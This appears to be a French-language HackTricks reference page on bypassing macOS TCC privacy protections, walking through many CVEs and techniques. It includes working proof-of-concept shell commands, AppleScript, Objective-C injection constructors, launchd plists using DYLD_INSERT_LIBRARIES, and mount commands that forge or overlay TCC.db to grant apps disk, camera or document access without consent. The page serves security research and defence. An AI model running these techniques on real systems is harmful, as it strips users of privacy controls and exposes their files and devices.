# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Par fonctionnalité

### Write Bypass

Ce n'est pas un bypass, c'est simplement ainsi que fonctionne TCC : **Il ne protège pas contre l'écriture**. Si Terminal **n'a pas accès en lecture au Desktop d'un utilisateur, il peut quand même y écrire** :
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
L'**attribut étendu `com.apple.macl`** est ajouté au nouveau **fichier** afin de donner à l'**application créatrice** l'accès nécessaire pour le lire.

### TCC ClickJacking

Il est possible de **placer une fenêtre par-dessus la demande TCC** afin de faire en sorte que l'utilisateur **l'accepte** sans s'en rendre compte. Vous trouverez un PoC dans [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Request by arbitrary name

Un attaquant peut **créer des applications avec n'importe quel nom** (par exemple Finder, Google Chrome...) dans l'**`Info.plist`** et leur faire demander l'accès à un emplacement protégé par TCC. L'utilisateur pensera que l'application légitime est à l'origine de cette demande d'accès.\
De plus, il est possible de **retirer l'application légitime du Dock et d'y placer la fausse**, de sorte que lorsque l'utilisateur clique sur la fausse application (qui peut utiliser la même icône), celle-ci puisse appeler l'application légitime, demander les permissions TCC et exécuter un malware, faisant croire à l'utilisateur que l'application légitime a demandé cet accès.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Plus d'informations et un PoC dans :


{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Par défaut, un accès via **SSH bénéficiait de "Full Disk Access"**. Pour le désactiver, vous devez l'ajouter à la liste, mais le laisser désactivé (le supprimer de la liste ne supprimera pas ces privilèges) :

![TCC Request by arbitrary name - SSH Bypass: Par défaut, un accès via SSH bénéficiait de "Full Disk Access". Pour le désactiver, vous devez l'ajouter à la liste, mais le laisser désactivé (le supprimer...](<../../../../../images/image (1077).png>)

Vous trouverez ici des exemples de **malwares ayant réussi à contourner cette protection** :

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Notez que désormais, pour pouvoir activer SSH, vous devez disposer de **Full Disk Access**

### Handle extensions - CVE-2022-26767

L'attribut **`com.apple.macl`** est attribué aux fichiers afin de donner à **une application donnée les permissions nécessaires pour les lire.** Cet attribut est défini lorsqu'un fichier est **glissé-déposé** sur une application ou lorsqu'un utilisateur **double-clique** sur un fichier pour l'ouvrir avec l'**application par défaut**.

Par conséquent, un utilisateur pourrait **enregistrer une application malveillante** pour gérer toutes les extensions et appeler Launch Services afin d'**ouvrir** n'importe quel fichier (ainsi, le fichier malveillant se verra accorder l'accès nécessaire pour le lire).

### iCloud

L'entitlement **`com.apple.private.icloud-account-access`** permet de communiquer avec le **service XPC `com.apple.iCloudHelper`**, qui **fournira des tokens iCloud**.

**iMovie** et **Garageband** disposaient de cet entitlement ainsi que d'autres qui le permettaient.

Pour plus d'**informations** sur l'exploit permettant d'**obtenir des tokens iCloud** grâce à cet entitlement, consultez la présentation : [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

Une application disposant de la permission **`kTCCServiceAppleEvents`** pourra **contrôler d'autres applications**. Cela signifie qu'elle pourrait être capable d'**abuser des permissions accordées aux autres applications**.

Pour plus d'informations sur les Apple Scripts, consultez :


{{#ref}}
macos-apple-scripts.md
{{#endref}}

Par exemple, si une application dispose de la **permission Automation sur `iTerm`**, comme dans cet exemple où **`Terminal`** a accès à iTerm :

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Over iTerm

Terminal, qui ne dispose pas de FDA, peut appeler iTerm, qui en dispose, et l'utiliser pour effectuer des actions :
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Via Finder

Ou si une App dispose d’un accès via Finder, elle pourrait exécuter un script tel que celui-ci :
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Par le comportement de l’application

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Le **tccd daemon** **userland** utilisait la variable d’environnement **`HOME`** pour accéder à la base de données TCC des utilisateurs depuis : **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Selon [ce post Stack Exchange](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686), et parce que le daemon TCC s’exécute via **`launchd`** dans le domaine de l’utilisateur actuel, il est possible de **contrôler toutes les variables d’environnement** qui lui sont transmises.\
Ainsi, un **attaquant pourrait définir la variable d’environnement `$HOME`** dans **`launchctl`** afin qu’elle pointe vers un **répertoire** **contrôlé**, **redémarrer** le daemon **TCC**, puis **modifier directement la base de données TCC** pour s’accorder **tous les privilèges TCC disponibles**, sans jamais demander l’autorisation à l’utilisateur final.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notes

Notes avait accès aux emplacements protégés par TCC, mais lorsqu'une note est créée, celle-ci est **créée dans un emplacement non protégé**. Ainsi, vous pouviez demander à Notes de copier un fichier protégé dans une note (donc dans un emplacement non protégé), puis accéder au fichier :

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translocation

Le binaire `/usr/libexec/lsd`, avec la bibliothèque `libsecurity_translocate`, possédait l'entitlement `com.apple.private.nullfs_allow`, qui lui permettait de créer un montage **nullfs**, ainsi que l'entitlement `com.apple.private.tcc.allow` avec **`kTCCServiceSystemPolicyAllFiles`** pour accéder à tous les fichiers.

Il était possible d'ajouter l'attribut de quarantaine à « Library », d'appeler le service XPC **`com.apple.security.translocation`**, puis celui-ci mapperait Library vers **`$TMPDIR/AppTranslocation/d/d/Library`**, où tous les documents contenus dans Library pouvaient être **accessibles**.

### CVE-2023-38571 - Music & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** possède une fonctionnalité intéressante : lorsqu'il est en cours d'exécution, il **importe** les fichiers déposés dans **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** dans la « bibliothèque multimédia » de l'utilisateur. De plus, il appelle quelque chose comme : **`rename(a, b);`**, où `a` et `b` sont :

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

Ce comportement **`rename(a, b);`** est vulnérable à une **Race Condition**, car il est possible de placer un faux fichier **TCC.db** dans le dossier `Automatically Add to Music.localized`, puis, lorsque le nouveau dossier (b) est créé, de copier le fichier, de le supprimer et de le faire pointer vers **`~/Library/Application Support/com.apple.TCC`**/.
**Plus d'informations** [**dans le writeup**](https://gergelykalman.com/CVE-2023-38571-a-macOS-TCC-bypass-in-Music-and-TV.html)


### SQLITE_SQLLOG_DIR - CVE-2023-32422

Si **`SQLITE_SQLLOG_DIR="path/folder"`** est défini, cela signifie essentiellement que **toute base de données ouverte est copiée vers ce chemin**. Dans ce CVE, ce mécanisme a été exploité pour **écrire** dans une **base de données SQLite** qui allait être **ouverte par un processus disposant de FDA, à savoir la base de données TCC**, puis **`SQLITE_SQLLOG_DIR`** a été exploité avec un **symlink dans le nom de fichier** afin que, lorsque cette base de données était **ouverte**, le fichier **TCC.db de l'utilisateur soit écrasé** par celle qui venait d'être ouverte.\
**Plus d'informations** [**dans le writeup**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **et**[ **dans la talk**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

Si la variable d'environnement **`SQLITE_AUTO_TRACE`** est définie, la bibliothèque **`libsqlite3.dylib`** commence à **journaliser** toutes les requêtes SQL. De nombreuses applications utilisaient cette bibliothèque ; il était donc possible de journaliser toutes leurs requêtes SQLite.

Plusieurs applications Apple utilisaient cette bibliothèque pour accéder à des informations protégées par TCC.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Cette **env variable est utilisée par le framework `Metal`**, qui est une dépendance de plusieurs programmes, notamment `Music`, qui dispose de FDA.

Définir ce qui suit : `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Si `path` est un répertoire valide, le bug se déclenche et nous pouvons utiliser `fs_usage` pour voir ce qui se passe dans le programme :

- un fichier sera `open()`é, nommé `path/.dat.nosyncXXXX.XXXXXX` (`X` est aléatoire)
- un ou plusieurs `write()` écriront le contenu dans le fichier (nous ne contrôlons pas cela)
- `path/.dat.nosyncXXXX.XXXXXX` sera `renamed()` en `path/name`

Il s'agit d'une écriture dans un fichier temporaire, suivie d'un **`rename(old, new)`** **qui n'est pas sécurisé.**

Ce n'est pas sécurisé, car les anciens et nouveaux chemins doivent être **résolus séparément**, ce qui peut prendre un certain temps et être vulnérable à une Race Condition. Pour plus d'informations, vous pouvez consulter la fonction `renameat_internal()` de `xnu`.

> [!CAUTION]
> Donc, en résumé, si un processus privilégié effectue un renommage depuis un dossier que vous contrôlez, vous pourriez obtenir une RCE et le faire accéder à un autre fichier ou, comme dans ce CVE, ouvrir le fichier créé par l'application privilégiée et conserver un FD.
>
> Si le renommage accède à un dossier que vous contrôlez, pendant que vous avez modifié le fichier source ou que vous disposez d'un FD vers celui-ci, vous pouvez modifier le fichier (ou dossier) de destination afin qu'il pointe vers un symlink, ce qui vous permet d'écrire quand vous le souhaitez.

Voici l'attaque utilisée dans le CVE. Par exemple, pour écraser le `TCC.db` de l'utilisateur, nous pouvons :

- créer `/Users/hacker/ourlink` pour qu'il pointe vers `/Users/hacker/Library/Application Support/com.apple.TCC/`
- créer le répertoire `/Users/hacker/tmp/`
- définir `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
- déclencher le bug en exécutant `Music` avec cette env variable
- intercepter le `open()` de `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (`X` est aléatoire)
- ici, nous `open()` également ce fichier en écriture et conservons le file descriptor
- échanger atomiquement `/Users/hacker/tmp` et `/Users/hacker/ourlink` **en boucle**
- nous faisons cela afin de maximiser nos chances de réussite, car la race window est très courte, mais perdre la race présente un inconvénient négligeable
- attendre un peu
- vérifier si nous avons eu de la chance
- sinon, recommencer depuis le début

Plus d'informations sur [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> Désormais, si vous essayez d'utiliser l'env variable `MTL_DUMP_PIPELINES_TO_JSON_FILE`, les applications ne se lanceront pas.

### Apple Remote Desktop

En tant que root, vous pouviez activer ce service et **l'agent ARD disposerait d'un accès complet au disque**, ce qui pourrait ensuite être exploité par un utilisateur pour lui faire copier une nouvelle **base de données utilisateur TCC**.

## Par **NFSHomeDirectory**

TCC utilise une base de données dans le dossier HOME de l'utilisateur afin de contrôler l'accès aux ressources spécifiques à l'utilisateur, à l'emplacement **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Par conséquent, si l'utilisateur parvient à redémarrer TCC avec une env variable `$HOME` pointant vers un **autre dossier**, il pourrait créer une nouvelle base de données TCC dans **/Library/Application Support/com.apple.TCC/TCC.db** et tromper TCC afin qu'il accorde n'importe quelle permission TCC à n'importe quelle app.

> [!TIP]
> Notez qu'Apple utilise le paramètre enregistré dans le profil de l'utilisateur, dans l'attribut **`NFSHomeDirectory`**, comme **valeur de `$HOME`**. Ainsi, si vous compromettez une application disposant des permissions nécessaires pour modifier cette valeur (**`kTCCServiceSystemPolicySysAdminFiles`**), vous pouvez **weaponize** cette option avec un TCC bypass.

### [CVE-2020–9934 - TCC](#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Le **premier POC** utilise [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) et [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) pour modifier le dossier **HOME** de l'utilisateur.

1. Obtenir un blob _csreq_ pour l'app ciblée.
2. Déposer un faux fichier _TCC.db_ avec les accès requis et le blob _csreq_.
3. Exporter l'entrée Directory Services de l'utilisateur avec [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Modifier l'entrée Directory Services afin de changer le répertoire personnel de l'utilisateur.
5. Importer l'entrée Directory Services modifiée avec [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Arrêter le _tccd_ de l'utilisateur et redémarrer le processus.

Le second POC utilisait **`/usr/libexec/configd`**, qui possédait `com.apple.private.tcc.allow` avec la valeur `kTCCServiceSystemPolicySysAdminFiles`.\
Il était possible d'exécuter **`configd`** avec l'option **`-t`**, ce qui permettait à un attaquant de spécifier un **Bundle personnalisé à charger**. Ainsi, l'exploit **remplace** la méthode **`dsexport`** et **`dsimport`** de modification du répertoire personnel de l'utilisateur par une **injection de code dans `configd`**.

Pour plus d'informations, consultez le [**rapport original**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Par injection de processus

Il existe différentes techniques pour injecter du code dans un processus et exploiter ses privilèges TCC :


{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

De plus, l'injection de processus la plus courante pour bypass TCC consiste à utiliser des **plugins (load library)**.\
Les plugins sont du code supplémentaire, généralement sous la forme de bibliothèques ou de fichiers plist, qui sera **chargé par l'application principale** et s'exécutera dans son contexte. Par conséquent, si l'application principale avait accès à des fichiers restreints par TCC (via des permissions accordées ou des entitlements), le **custom code y aura également accès**.

### CVE-2020-27937 - Directory Utility

L'application `/System/Library/CoreServices/Applications/Directory Utility.app` possédait l'entitlement **`kTCCServiceSystemPolicySysAdminFiles`**, chargeait des plugins avec l'extension **`.daplug`** et **n'utilisait pas le runtime hardened**.

Pour weaponize ce CVE, le **`NFSHomeDirectory`** est **modifié** (en exploitant l'entitlement précédent) afin de pouvoir **prendre le contrôle de la base de données TCC de l'utilisateur** et bypass TCC.

Pour plus d'informations, consultez le [**rapport original**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Le binaire **`/usr/sbin/coreaudiod`** possédait les entitlements `com.apple.security.cs.disable-library-validation` et `com.apple.private.tcc.manager`. Le premier **autorisait l'injection de code**, tandis que le second lui donnait accès à la **gestion de TCC**.

Ce binaire permettait de charger des **plug-ins tiers** depuis le dossier `/Library/Audio/Plug-Ins/HAL`. Il était donc possible de **charger un plugin et d'exploiter les permissions TCC** avec ce POC :
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Pour plus d'informations, consultez le [**rapport original**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Couche d'abstraction des périphériques (DAL) Plug-Ins

Les applications système qui ouvrent un flux caméra via Core Media I/O (applications avec **`kTCCServiceCamera`**) chargent dans le processus ces plugins situés dans `/Library/CoreMediaIO/Plug-Ins/DAL` (non restreint par SIP).

Il suffit d'y stocker une bibliothèque avec le **constructor** habituel pour **injecter du code**.

Plusieurs applications Apple étaient vulnérables à cela.

### Firefox

L'application Firefox possédait les entitlements `com.apple.security.cs.disable-library-validation` et `com.apple.security.cs.allow-dyld-environment-variables` :
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Pour plus d’informations sur la façon de l’exploiter facilement, [**consultez le rapport original**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Le binaire `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` disposait des entitlements **`com.apple.private.tcc.allow`** et **`com.apple.security.get-task-allow`**, ce qui permettait d’injecter du code dans le processus et d’utiliser les privilèges TCC.

### CVE-2023-26818 - Telegram

Telegram disposait des entitlements **`com.apple.security.cs.allow-dyld-environment-variables`** et **`com.apple.security.cs.disable-library-validation`**. Il était donc possible de les exploiter pour **accéder à ses permissions**, notamment pour effectuer des enregistrements avec la caméra. Vous pouvez [**trouver le payload dans le writeup**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Notez que, pour utiliser la variable d’environnement afin de charger une bibliothèque, un **custom plist** a été créé pour injecter cette bibliothèque, puis **`launchctl`** a été utilisé pour la lancer :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Par des invocations de open

Il est possible d'invoquer **`open`** même en étant sandboxé.

### Scripts Terminal

Il est assez courant d'accorder un **Full Disk Access (FDA)** à Terminal, au moins sur les ordinateurs utilisés par des personnes travaillant dans la tech. Il est également possible d'invoquer des scripts **`.terminal`** avec cet accès.

Les scripts **`.terminal`** sont des fichiers plist tels que celui-ci, contenant la commande à exécuter dans la clé **`CommandString`** :
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Une application pourrait écrire un script de terminal dans un emplacement tel que `/tmp` et le lancer avec une commande telle que :
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## By mounting

### CVE-2020-9771 - mount_apfs TCC bypass and privilege escalation

**Tout utilisateur** (même non privilégié) peut créer et monter un snapshot Time Machine et **accéder à TOUS les fichiers** de ce snapshot.\
Le **seul privilège** nécessaire est que l'application utilisée (comme `Terminal`) dispose de l'accès **Full Disk Access** (FDA) (`kTCCServiceSystemPolicyAllfiles`), qui doit être accordé par un administrateur.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Une explication plus détaillée peut être [**consultée dans le rapport original**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Mount over TCC file

Même si le fichier de la DB TCC est protégé, il était possible de **monter sur le répertoire** un nouveau fichier TCC.db :
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Consultez l’**exploit complet** dans le [**writeup original**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Comme expliqué dans le [writeup original](https://www.kandji.io/blog/macos-audit-story-part2), ce CVE exploitait `diskarbitrationd`.

La fonction `DADiskMountWithArgumentsCommon` du framework public `DiskArbitration` effectuait les contrôles de sécurité. Cependant, il était possible de les contourner en appelant directement `diskarbitrationd` et donc d'utiliser des éléments `../` dans le chemin ainsi que des symlinks.

Cela permettait à un attaquant d'effectuer des mounts arbitraires à n'importe quel emplacement, notamment par-dessus la base de données TCC, grâce à l'entitlement `com.apple.private.security.storage-exempt.heritable` de `diskarbitrationd`.

### asr

L'outil **`/usr/sbin/asr`** permettait de copier l'intégralité du disque et de le monter à un autre emplacement en contournant les protections TCC.

### Services de localisation

Il existe une troisième base de données TCC dans **`/var/db/locationd/clients.plist`**, qui indique les clients autorisés à **accéder aux services de localisation**.\
Le dossier **`/var/db/locationd/` n'était pas protégé contre le montage de DMG**, il était donc possible de monter notre propre plist.

## Via les startup apps


{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Via grep

Dans plusieurs cas, les fichiers stockeront des informations sensibles comme des adresses e-mail, des numéros de téléphone, des messages... dans des emplacements non protégés (ce qui constitue une vulnérabilité selon Apple).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Cela ne fonctionne plus, mais cela [**fonctionnait auparavant**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Une autre méthode utilisant les [**événements CoreGraphics**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf):

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Références

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
